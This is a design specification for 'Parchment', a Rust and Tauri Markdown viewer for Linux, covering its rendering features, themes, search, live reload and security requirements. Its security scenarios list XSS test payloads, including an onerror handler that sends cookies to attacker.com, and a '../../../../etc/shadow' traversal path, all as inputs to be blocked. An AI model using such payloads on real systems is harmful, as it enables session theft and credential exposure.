# Specification: Parchment Markdown Viewer

**Status**: PROPOSED  
**Author**: Domain Expert (`domain-expert`)  
**Date**: 2026-10-28  
**Target Release**: Parchment v0.1.0 (Batch 1 - Core Viewer)  

---

## 1. Problem Statement & Background

### 1.1 Context
Reading technical documentation, notes, literary drafts, architecture decision records (ADRs), and README files in modern Linux desktop environments (GNOME/Ubuntu, KDE Plasma, XFCE, and XDG-compliant distros) is frequently cumbersome. Users typically must choose between:
1. Heavyweight text editors / IDEs (VS Code, JetBrains) that consume excessive memory and present visually noisy editing chrome when the user only wants to read.
2. Web-based viewers that require launching a full browser window, lack seamless local file manager integration, and compromise privacy.
3. Raw terminal pagers (`bat`, `cat`, `less`) which cannot render mathematical formulas, complex Mermaid diagrams, or rich typographic layouts.

**Parchment** is a crisp, literary, distraction-free desktop Markdown viewer engineered in Rust + Tauri. It focuses strictly on an elegant, fast, and secure reading experience with seamless Linux desktop integration.

### 1.2 Goals
- Provide a dedicated, native Linux Markdown reader that launches instantly, with distraction-free typography and zero visual clutter.
- Integrate smoothly with Linux desktop environments via standard XDG desktop entry specifications (`parchment.desktop`) and MIME type registrations (`text/markdown`, `text/x-markdown`, `.md`, `.markdown`), allowing direct launch from file managers (e.g. GNOME Files / Nautilus "Open With") and the command line (`parchment <path>`).
- Render comprehensive GitHub-Flavored Markdown (GFM), including GitHub-style alerts (`[!NOTE]`, `[!TIP]`, `[!IMPORTANT]`, `[!WARNING]`, `[!CAUTION]`), tables, task lists, code blocks with syntax highlighting and one-click copy, and local relative images.
- Provide client-side rendering for mathematical notation via KaTeX (inline `$...$` and display `$$...$$`) and diagrams via Mermaid.
- Deliver automated and manual theme controls: automatic synchronization with the desktop dark/light mode preference via Freedesktop/GNOME settings, along with explicit toggles for Light, Dark, Sepia ("Parchment"), and System modes.
- Implement reading ergonomics: collapsible hierarchical Table of Contents (TOC) with scroll-spy heading tracking, in-document search (`Ctrl+F`) with count, highlighting, and navigation.
- Ensure live synchronicity: automatic file-system watching that re-renders documents upon external modification on disk while maintaining exact user scroll position.
- Enforce strict security boundaries: sanitize all rendered HTML and SVG to prevent script injection (XSS) from untrusted Markdown files opened from the web or disk, restricting local asset access to authorized directory bounds.

### 1.3 Non-Goals (Out of Scope for Batch 1)
- **Document Editing / Authoring**: Parchment is strictly a viewer and reader in Batch 1. WYSIWYG editing, inline text manipulation, and saving changes back to disk are explicitly out of scope.
- **Multi-Tab / Multi-Pane Layout**: Batch 1 opens one active document per application window. Multi-tab document browsing is deferred to future milestones.
- **Export to PDF / EPUB / HTML**: Batch 1 focuses on interactive on-screen reading; print/export pipelines are deferred.
- **Remote / Cloud Markdown Sync**: Batch 1 operates entirely on local filesystem paths (`file://`). Fetching documents over HTTP/HTTPS/WebDAV directly into the viewer is out of scope.
- **Arbitrary External Plugin Execution**: No user-supplied JavaScript plugins or unverified third-party rendering extensions.

---

## 2. Domain Concepts & Models

The Parchment domain is modeled around documents, visual themes, navigation outlines, interactive search, file system synchronization, and rendering security boundaries.

```
+-----------------------------------------------------------------------------------+
|                                  Parchment Domain                                 |
+-----------------------------------------------------------------------------------+
|                                                                                   |
|  +------------------+         +--------------------+         +-----------------+  |
|  | DocumentLocation | 1     1 |  MarkdownDocument  | 1     1 | RenderedContent |  |
|  | - CanonicalPath  +-------->+ - RawText          +-------->+ - HtmlBody      |  |
|  | - DisplayName    |         | - Encoding (UTF-8) |         | - Outline (TOC) |  |
|  | - LastModified   |         | - ByteSize         |         | - Blocks & AST  |  |
|  +------------------+         +--------------------+         +-----------------+  |
|                                         |                                         |
|                                         | 1                                       |
|                                         v 1                                       |
|                               +--------------------+                              |
|                               |  DocumentSession   |                              |
|                               | - ScrollPosition   |                              |
|                               | - ActiveSectionId  |                              |
|                               | - WatcherHandle    |                              |
|                               +--------------------+                              |
|                                                                                   |
|  +------------------+         +--------------------+         +-----------------+  |
|  |   ThemeManager   |         |    SearchSession   |         | SecurityPolicy  |  |
|  | - UserPreference |         | - Query            |         | - SanitizerRule |  |
|  | - SystemState    |         | - MatchCollection  |         | - AssetBoundary |  |
|  | - EffectiveTheme |         | - ActiveMatchIndex |         | - CSP Directives|  |
|  +------------------+         +--------------------+         +-----------------+  |
+-----------------------------------------------------------------------------------+
```

### 2.1 Core Entities & Value Objects

#### 2.1.1 DocumentLocation
Represents a validated, canonicalized target file on the local file system.
- **Attributes**:
  - `canonical_path: AbsolutePath` (Normalized absolute file path, e.g. `/home/user/notes/spec.md`)
  - `parent_dir: AbsolutePath` (Directory containing the file, used as root for relative asset resolution)
  - `display_name: String` (File name or stem shown in title bar and UI header)
  - `extension: String` (`md`, `markdown`, or custom text extension)
  - `last_modified: SystemTime` (Timestamp of last disk modification)
- **Invariants**:
  - `canonical_path` must exist on the local file system at time of initial resolution.
  - `canonical_path` must point to a regular file, not a directory, socket, or device node.
  - Path traversal sequences (`..`) must be fully resolved.

#### 2.1.2 MarkdownDocument
Represents the in-memory representation of the raw Markdown file.
- **Attributes**:
  - `location: DocumentLocation`
  - `raw_content: String` (UTF-8 encoded string contents)
  - `byte_size: usize` (Size of the file in bytes)
- **Invariants**:
  - Must be valid UTF-8. Non-UTF-8 or binary content triggers a `BinaryFileDetected` error.
  - Byte size must not exceed the configured maximum buffer limit (`MAX_DOCUMENT_SIZE = 10 MiB` in Batch 1).

#### 2.1.3 RenderedContent
The compiled, sanitized presentation model produced from the raw document.
- **Attributes**:
  - `sanitized_html: String` (Safe HTML generated by the Markdown parser and DOM sanitizer)
  - `outline: DocumentOutline` (Hierarchical structure of document headings)
  - `diagram_blocks: Vec<MermaidBlock>` (Extracted Mermaid code blocks)
  - `math_blocks: Vec<MathBlock>` (Extracted LaTeX math expressions)
- **Invariants**:
  - `sanitized_html` must not contain un-sanitized `<script>`, `<iframe>`, `<object>`, `<embed>`, or arbitrary `javascript:` URI schemes.
  - All relative image URLs in `sanitized_html` must be rewritten to secure local asset URLs pointing exclusively within allowed directory scopes.

#### 2.1.4 DocumentOutline & TocItem
Hierarchical representation of document headings used for the Table of Contents sidebar.
- **Attributes (`TocItem`)**:
  - `id: String` (Unique, URL-safe slug identifying the heading anchor, e.g. `section-2-1`)
  - `title: String` (Plain-text title of the heading, stripped of markdown formatting)
  - `level: u8` (Heading depth: 1 for `h1` through 6 for `h6`)
  - `line_number: usize` (Source line number in the raw document)
  - `children: Vec<TocItem>` (Nested sub-headings)
- **Invariants**:
  - `level` must be in the range `1..=6`.
  - `id` slugs must be strictly unique within the document outline (duplicate titles receive deterministic disambiguation suffixes, e.g. `-1`, `-2`).

#### 2.1.5 ThemeState & ThemeMode
Controls the visual appearance of the reader.
- **`ThemeMode` (Enum)**:
  - `System` (Default: automatically follows OS dark/light mode preference)
  - `Light` (High-contrast crisp white background, dark gray ink)
  - `Dark` (Subdued dark slate background, warm off-white ink)
  - `Sepia` (Warm literary parchment tone, dark amber/brown ink)
- **`ResolvedTheme` (Enum)**:
  - `Light` | `Dark` | `Sepia` (The concrete active palette applied to typography, background, code syntax, and diagrams)
- **Invariants**:
  - If `ThemeMode == System`, `ResolvedTheme` reflects the OS color-scheme preference (`prefers-color-scheme: dark` evaluates to `Dark`; otherwise `Light`).
  - User selection of `ThemeMode` persists across application sessions in `$XDG_CONFIG_HOME/parchment/config.json`.

#### 2.1.6 AlertBlock
Represents GitHub-Flavored Markdown callout alerts parsed from blockquote syntax.
- **`AlertType` (Enum)**:
  - `Note` (`[!NOTE]`: Blue accent, informational icon)
  - `Tip` (`[!TIP]`: Green accent, lightbulb icon)
  - `Important` (`[!IMPORTANT]`: Purple accent, exclamation circle icon)
  - `Warning` (`[!WARNING]`: Amber accent, warning triangle icon)
  - `Caution` (`[!CAUTION]`: Red accent, stop/octagonal icon)
- **Attributes**:
  - `alert_type: AlertType`
  - `body_html: String` (Rendered HTML contents inside the alert)
- **Invariants**:
  - Must match the standard GitHub alert syntax: the blockquote begins with `> [!TYPE]` on its first line.

#### 2.1.7 SearchState
Maintains the state of in-document text search (`Ctrl+F`).
- **Attributes**:
  - `query: String` (Search term, case-insensitive by default)
  - `total_matches: usize` (Count of occurrences found in current document)
  - `active_match_index: usize` (0-indexed current match cursor, or `0` when `total_matches == 0`)
  - `match_elements: Vec<SearchMatch>` (DOM target positions or offsets)
- **Invariants**:
  - When `total_matches > 0`, `active_match_index < total_matches`.
  - When `total_matches == 0`, `active_match_index == 0`.
  - Closing the search bar removes all active search highlights from the DOM.

#### 2.1.8 WatcherSession
Encapsulates active filesystem monitoring for live reloads.
- **Attributes**:
  - `target_path: AbsolutePath`
  - `debounce_duration: Duration` (Default: 150 milliseconds)
  - `scroll_position: ScrollCoordinates` (Vertical scroll offset ratio or pixel offset saved prior to re-render)
- **Invariants**:
  - Rapid file modifications within the debounce window are coalesced into a single reload event.
  - If the watched file is deleted or moved on disk, the watcher emits a non-fatal warning notification and retains the current document in view.

---

## 3. Interfaces & Contracts

### 3.1 CLI & Linux Desktop Integration Contracts

#### 3.1.1 Command Line Interface (CLI)
Parchment provides a standard CLI executable:

```text
Usage: parchment [OPTIONS] [FILE]

Arguments:
  [FILE]  Path to the Markdown file to open (.md, .markdown, or text file)

Options:
  -t, --theme <THEME>  Override initial theme: [system | light | dark | sepia]
  -h, --help           Print help information
  -V, --version        Print version information
```

- **Exit Codes**:
  - `0`: Normal exit / window closed by user.
  - `1`: Invalid arguments / unparseable CLI flags.
  - `2`: Target file does not exist or cannot be accessed.
  - `3`: Target file is binary or corrupted.

#### 3.1.2 XDG Desktop Entry Specification (`parchment.desktop`)
To integrate with GNOME Files (Nautilus), Dolphin, Thunar, and XDG application menus:

```ini
[Desktop Entry]
Type=Application
Name=Parchment
GenericName=Markdown Viewer
Comment=A crisp, literary, distraction-free Markdown viewer
Exec=parchment %F
Icon=parchment
Terminal=false
Categories=Utility;TextTools;Office;Viewer;
MimeType=text/markdown;text/x-markdown;text/plain;
Keywords=markdown;viewer;reader;gfm;mermaid;katex;
StartupNotify=true
StartupWMClass=parchment
```

- `%F` allows opening files passed directly from file manager "Open With" context menus or drag-and-drop.

#### 3.1.3 Configuration File (`$XDG_CONFIG_HOME/parchment/config.json`)
Persistent user preferences are saved to standard XDG paths (default: `~/.config/parchment/config.json`):

```json
{
  "version": 1,
  "theme_mode": "system",
  "toc_visible": true,
  "font_size_px": 16,
  "line_width_ch": 75,
  "auto_reload": true
}
```

---

### 3.2 Tauri IPC & Internal Service Contracts

Parchment uses Tauri's IPC bridge between the Rust core and the modern frontend rendering layer.

#### 3.2.1 `open_document`
Loads and parses a document from disk, setting up filesystem monitoring.

- **Request**:
  ```json
  {
    "path": "/home/oyvind/notes/architecture.md"
  }
  ```
- **Success Response (200 OK equivalent)**:
  ```json
  {
    "status": "ok",
    "document": {
      "canonical_path": "/home/oyvind/notes/architecture.md",
      "display_name": "architecture.md",
      "raw_markdown": "# System Architecture\n\n...",
      "sanitized_html": "<h1 id=\"system-architecture\">System Architecture</h1>...",
      "outline": [
        {
          "id": "system-architecture",
          "title": "System Architecture",
          "level": 1,
          "line_number": 1,
          "children": [
            {
              "id": "component-overview",
              "title": "Component Overview",
              "level": 2,
              "line_number": 12,
              "children": []
            }
          ]
        }
      ],
      "last_modified_ms": 1730104800000,
      "byte_size": 4096
    }
  }
  ```
- **Error Responses**:
  - `FILE_NOT_FOUND`: Target path does not exist.
    ```json
    { "status": "error", "code": "FILE_NOT_FOUND", "message": "File not found: /path/to/missing.md" }
    ```
  - `PERMISSION_DENIED`: Insufficient read permissions.
    ```json
    { "status": "error", "code": "PERMISSION_DENIED", "message": "Read access denied." }
    ```
  - `BINARY_FILE_DETECTED`: File contains null bytes or binary magic signatures.
    ```json
    { "status": "error", "code": "BINARY_FILE_DETECTED", "message": "The selected file is binary and cannot be viewed as Markdown." }
    ```
  - `FILE_TOO_LARGE`: File exceeds 10 MiB limit.
    ```json
    { "status": "error", "code": "FILE_TOO_LARGE", "message": "File size exceeds 10 MiB limit." }
    ```

#### 3.2.2 `get_user_preferences` & `set_user_preference`
Retrieves or updates user settings.

- **`set_user_preference` Request**:
  ```json
  {
    "key": "theme_mode",
    "value": "sepia"
  }
  ```
- **Success Response**:
  ```json
  { "status": "ok", "updated_config": { "theme_mode": "sepia", "toc_visible": true } }
  ```

#### 3.2.3 `resolve_asset_path`
Resolves relative image paths relative to the document parent directory, producing an authorized asset URI.

- **Request**:
  ```json
  {
    "document_path": "/home/oyvind/notes/spec.md",
    "relative_asset": "./diagrams/flowchart.png"
  }
  ```
- **Success Response**:
  ```json
  {
    "status": "ok",
    "resolved_uri": "asset:///home/oyvind/notes/diagrams/flowchart.png"
  }
  ```
- **Error Response**:
  - `DIRECTORY_TRAVERSAL_PROHIBITED`: Path tries to traverse outside allowed bounds.

#### 3.2.4 Backend-to-Frontend Events
The Rust core emits asynchronous events over the Tauri window channel:

| Event Name | Payload | Trigger Condition |
| :--- | :--- | :--- |
| `document-file-changed` | `{"canonical_path": "...", "raw_markdown": "...", "outline": [...]}` | File watcher detects modification after debounce. |
| `document-file-deleted` | `{"canonical_path": "..."}` | Watched file was unlinked or moved. |
| `system-theme-changed` | `{"system_is_dark": true}` | OS `prefers-color-scheme` or Freedesktop DBus setting toggled. |

---

## 4. Behavioral Acceptance Criteria

### Feature Slice 1: Document Loading & Desktop Integration

#### Scenario 1.1: Launch via CLI with valid Markdown file
- **Given** a valid UTF-8 Markdown file exists at `/home/user/docs/readme.md`
- **When** the user executes `parchment /home/user/docs/readme.md` in a terminal
- **Then** Parchment launches an application window within 300ms
- **And** the window title displays `readme.md - Parchment`
- **And** the rendered Markdown content is displayed in the main reading area
- **And** the TOC sidebar is populated with headings parsed from `readme.md`.

#### Scenario 1.2: Launch via GNOME "Open With" / File Manager
- **Given** Parchment is installed with its XDG `.desktop` file registered for `text/markdown`
- **When** the user right-clicks a `.markdown` file in GNOME Files (Nautilus) and selects "Open With Parchment"
- **Then** Parchment receives the absolute file path via `%F`
- **And** opens the document with full GFM rendering and file watching activated.

#### Scenario 1.3: Launch with no file argument (Empty State)
- **Given** the user runs `parchment` without arguments from the CLI or application launcher
- **When** the application starts
- **Then** an elegant empty state view is presented with the Parchment emblem
- **And** an "Open File" button is displayed with the shortcut hint `Ctrl+O`
- **And** clicking "Open File" or pressing `Ctrl+O` triggers the native Linux file chooser filtered for Markdown files (`*.md`, `*.markdown`, `*.txt`).

---

### Feature Slice 2: GitHub-Flavored Markdown (GFM) Rendering

#### Scenario 2.1: Render GFM Tables and Task Lists
- **Given** a Markdown document contains standard GFM tables (`| Col 1 | Col 2 |`) and interactive-style task lists (`- [x] Done`, `- [ ] Todo`)
- **When** the document is rendered
- **Then** tables are formatted with clean borders, padded cells, and alternating row zebra striping (in dark/light appropriate contrast)
- **And** task list checkboxes are rendered in read-only visual presentation with accessible checkboxes
- **And** completed items have distinct strikethrough styling.

#### Scenario 2.2: Render GitHub-Style Callout Alerts
- **Given** a Markdown document contains callout blocks using GitHub alert syntax:
  ```markdown
  > [!NOTE]
  > Useful information that users should know.
  > [!WARNING]
  > Critical alert warning of dangerous actions.
  ```
- **When** Parchment parses the blockquotes
- **Then** `[!NOTE]` is rendered as a distinct alert box with a blue accent border, blue badge, and information icon
- **And** `[!WARNING]` is rendered with an amber accent border, amber badge, and warning triangle icon
- **And** similar distinct color accents and icons are rendered for `[!TIP]`, `[!IMPORTANT]`, and `[!CAUTION]`
- **And** standard blockquotes (`> text`) without alert markers remain styled as traditional literary quotation blocks.

#### Scenario 2.3: Syntax Highlighting and Code Block Copy Button
- **Given** a fenced code block with a specified language tag (e.g. ```` ```rust ````):
  ```rust
  fn main() { println!("Hello, Parchment!"); }
  ```
- **When** the document is displayed
- **Then** syntax highlighting is applied matching the active theme (Light, Dark, or Sepia)
- **And** a discreet "Copy" button appears in the top-right corner of the code block on hover / focus
- **And** clicking the "Copy" button copies the exact raw code text to the system clipboard
- **And** the button text briefly changes to "Copied!" with a checkmark for 2 seconds.

#### Scenario 2.4: Relative Image Resolution
- **Given** a Markdown document at `/home/user/docs/notes.md` referencing an image via `![Architecture Diagram](./images/arch.png)`
- **When** the document is rendered
- **Then** Parchment resolves the image path to `/home/user/docs/images/arch.png` via the secure local asset protocol
- **And** the image is rendered inline with appropriate max-width constraints (100% of reading column)
- **And** if the image file does not exist, an accessible broken-image placeholder is displayed without crashing the viewer.

---

### Feature Slice 3: Theme Management & System Sync

#### Scenario 3.1: Automatic System Theme Detection
- **Given** the user's theme preference is set to `System` (default)
- **When** the GNOME desktop environment toggles from light mode to dark mode (via `org.freedesktop.appearance.color-scheme`)
- **Then** Parchment detects the change instantly
- **And** transitions its UI, document canvas, syntax highlighting, and diagram colors to the `Dark` palette without page reloads.

#### Scenario 3.2: Manual Theme Selection and Persistence
- **Given** the viewer is currently displaying the `Dark` theme
- **When** the user clicks the Theme Selector menu or presses the theme shortcut (`F10`) and chooses `Sepia (Parchment)`
- **Then** the canvas immediately updates to warm literary tones (hex `#FBF0D9` or similar background, dark warm ink `#2C221E`)
- **And** the preference `theme_mode: "sepia"` is written to `$XDG_CONFIG_HOME/parchment/config.json`
- **And** the next time Parchment is launched, the `Sepia` theme is loaded regardless of system desktop mode.

---

### Feature Slice 4: Navigation, TOC & In-Document Search

#### Scenario 4.1: Table of Contents (TOC) Generation & Hierarchy
- **Given** a Markdown file with multiple nested headings (`h1` down to `h6`)
- **When** the document is opened
- **Then** Parchment generates a hierarchical list in the collapsible left sidebar
- **And** sub-headings are indented corresponding to their depth level
- **And** clicking any TOC item smoothly scrolls the document to bring the targeted heading to the top of the viewport
- **And** pressing `Ctrl+\` toggles the visibility of the TOC sidebar.

#### Scenario 4.2: Scroll-Spy Active Heading Tracking
- **Given** a long document with a visible TOC sidebar
- **When** the user scrolls through the document
- **Then** the TOC sidebar automatically highlights the heading currently visible in the active viewport
- **And** if the active heading is nested in an off-screen portion of the TOC, the TOC container auto-scrolls to keep the active item in view.

#### Scenario 4.3: In-Document Search Bar (`Ctrl+F`) Navigation
- **Given** a document is open in the viewer
- **When** the user presses `Ctrl+F`
- **Then** a floating, distraction-free search bar appears at the top right of the reading area
- **And** focus is automatically placed in the search input
- **When** the user types `render`
- **Then** all occurrences of `render` in the document text are highlighted with yellow marks
- **And** a match indicator displays `1 of 14` (or `0 matches` if none found)
- **And** pressing `Enter` or clicking `Next` advances focus to match 2, scrolling it into view
- **And** pressing `Shift+Enter` or clicking `Prev` moves backward to match 1
- **And** pressing `Esc` closes the search bar and removes all highlight spans from the document.

---

### Feature Slice 5: Mermaid Diagrams & LaTeX Math (KaTeX)

#### Scenario 5.1: Client-Side Mermaid Diagram Rendering
- **Given** a fenced code block with language `mermaid`:
  ```mermaid
  graph TD
    A[Raw Markdown] --> B[Sanitized AST]
    B --> C[Rendered View]
  ```
- **When** the document is processed
- **Then** the code block is converted into an inline SVG diagram
- **And** the diagram colors adapt cleanly to the active theme (e.g., dark background nodes in Dark mode, parchment styling in Sepia)
- **And** the SVG scales responsively within the reading container.

#### Scenario 5.2: Graceful Mermaid Syntax Error Boundary
- **Given** a fenced code block with language `mermaid` contains invalid syntax:
  ```mermaid
  graph Broken --> %% Missing nodes and invalid arrows
  ```
- **When** the Mermaid engine attempts to render the block
- **Then** it does not crash the application or halt remaining document rendering
- **And** the block renders a clean, styled error box:
  `[Mermaid Diagram Error: Unable to render syntax]`
- **And** an expandable disclosure toggle allows viewing the raw code snippet and parser error message.

#### Scenario 5.3: LaTeX Math Rendering with KaTeX
- **Given** a Markdown document containing:
  - Inline math: `$E = mc^2$`
  - Display block math:
    ```markdown
    $$
    \frac{-b \pm \sqrt{b^2 - 4ac}}{2a}
    $$
    ```
- **When** the document is rendered
- **Then** `$E = mc^2$` renders as crisp typographic inline math symbols
- **And** the display block renders centered with proper mathematical formatting and font glyphs
- **And** invalid math expressions (e.g. `$\frac{1}{$` ) trigger a non-crashing inline KaTeX warning showing the raw formula in red monospaced text.

---

### Feature Slice 6: Live Auto-Reload & Disk Synchronization

#### Scenario 6.1: Live Reload on External Modification
- **Given** Parchment has `/home/user/notes/draft.md` open and the user has scrolled to line 250 (e.g. 45% scroll offset)
- **When** an external editor or git pull modifies `draft.md` on disk
- **Then** the file watcher detects the change within 150ms
- **And** Parchment re-reads the file from disk and updates the DOM
- **And** the user's vertical scroll position is preserved at exactly 45% (or anchored to the same heading) without jarring jumps.

#### Scenario 6.2: External File Deletion or Move
- **Given** `/home/user/notes/draft.md` is open in Parchment
- **When** the file is deleted or renamed from the terminal (`rm draft.md`)
- **Then** Parchment does not crash or display an empty screen
- **And** a gentle notification banner appears: `"File was moved or deleted from disk. Keeping current buffer."`
- **And** if the file is recreated at the same path, live watching resumes automatically.

---

### Feature Slice 7: Security, Error Handling & Edge Cases

#### Scenario 7.1: HTML Sanitization & XSS Mitigation
- **Given** a Markdown file opened from an untrusted source containing malicious payloads:
  ```markdown
  Hello <script>alert(window.origin)</script>
  <img src="x" onerror="fetch('http://attacker.com?c='+document.cookie)" />
  <a href="javascript:alert('pwned')">Click here</a>
  ```
- **When** the document is parsed and rendered
- **Then** the `<script>` tag is completely stripped from the DOM
- **And** the `onerror` attribute is stripped from the `<img>` tag
- **And** the `javascript:` href is stripped or rendered inert (`#`)
- **And** no arbitrary script execution occurs under any circumstances.

#### Scenario 7.2: Missing File Handling
- **Given** the user passes a non-existent path: `parchment /tmp/does-not-exist.md`
- **When** the application opens
- **Then** an informative error screen is displayed: `"File Not Found: /tmp/does-not-exist.md"`
- **And** an "Open Another File" button allows picking a valid document.

#### Scenario 7.3: Binary File Detection
- **Given** the user attempts to open an ELF binary or JPEG image with a `.md` extension: `parchment image.png.md`
- **When** Parchment inspects the file buffer
- **Then** it detects binary signatures / null bytes within the first 8 KiB
- **And** refuses to render the content as text
- **And** displays an error view: `"Binary file detected. Parchment only renders UTF-8 Markdown and text files."`

#### Scenario 7.4: Directory Traversal Sandboxing for Assets
- **Given** a document at `/home/user/docs/report.md` contains an image tag referencing `../../../../etc/shadow`
- **When** Parchment resolves the asset URI
- **Then** the asset resolver rejects the path
- **And** refuses to load or leak files from unauthorized system directories.

---

## 5. Non-Functional Requirements (NFRs)

### 5.1 Quality, Mutation Testing & Hybrid CRAP Policy
- **Automated Test Derivation**: Every Given/When/Then scenario in Section 4 must map directly to automated tests in Phase 2.
- **Mutation Testing Score**: All core domain modules (Markdown parser adapter, TOC outline generator, alert processor, asset resolver, security sanitizer, and search engine) must achieve a **Mutation Score ≥ 80%** via `cargo-mutants` (or Stryker/equivalent tool runner).
- **Hybrid CRAP Metric**: All newly authored Rust functions and TypeScript/JavaScript frontend helpers must maintain **$\text{CRAP} \le 8$** (Cyclomatic Complexity $CC \le 7$). Functions exceeding this threshold will be flagged and rejected by the reviewer audit.

### 5.2 Performance SLAs
- **Startup Time (Cold Launch)**: Time from process execution (`parchment file.md`) to rendered interactive view must be **< 300 milliseconds** on modern Linux desktop hardware for documents up to 50 KB.
- **Live Reload Latency**: Time from disk change write to updated DOM render must be **< 200 milliseconds** (including 150ms debounce).
- **Large Document Capacity**: Seamlessly render and navigate documents up to 5 MiB (~100,000 words / 20,000 lines) without freezing the UI thread or exceeding 150 MB of resident memory.
- **Search Responsiveness**: Search queries must update match indices and highlights within **< 50 milliseconds** for documents up to 50,000 words.

### 5.3 Security & Sandboxing Architecture
- **Tauri Content Security Policy (CSP)**:
  `default-src 'self'; img-src 'self' asset: data:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; script-src 'self'; connect-src 'none';`
- **No Remote Network Access**: In Batch 1, the frontend cannot make external network calls (`connect-src 'none'`), strictly preventing exfiltration of document contents.
- **Strict DOM Sanitization**: All HTML generated from Markdown is sanitized using DOMPurify (or equivalent hardened Rust sanitizer such as `ammonia`) prior to insertion into the document tree.

### 5.4 Accessibility (a11y) & Usability
- **WCAG 2.1 / 2.2 AA Compliance**:
  - High-contrast visual palettes: Minimum 4.5:1 text-to-background contrast ratio across all four themes (Light, Dark, Sepia, and System variants).
  - Full keyboard accessibility: Every function (TOC toggle, search, next/prev match, theme toggle, copy code, open file) must be operable via standard keyboard shortcuts (`Ctrl+F`, `Ctrl+O`, `Ctrl+\`, `F10`, `Esc`, `Tab`, `Shift+Tab`).
  - Screen reader semantic markup: Proper ARIA roles and landmarks (`role="main"`, `role="navigation"`, `aria-expanded` on TOC, `aria-live="polite"` on search match counter and live reload status).

### 5.5 Desktop & OS Interoperability
- **Platform**: Linux (X11 & Wayland). Tested on Ubuntu 22.04/24.04 LTS, Fedora, Arch Linux, and generic XDG-compliant environments.
- **Window Management**: Clean window decoration adhering to GTK / Freedesktop standards (`libadwaita` / native decoration style where supported).
- **Packaging Readiness**: Designed for seamless packaging into standard Linux distribution formats: standalone ELF binary, `.deb` package, and Flatpak/AppImage manifests.
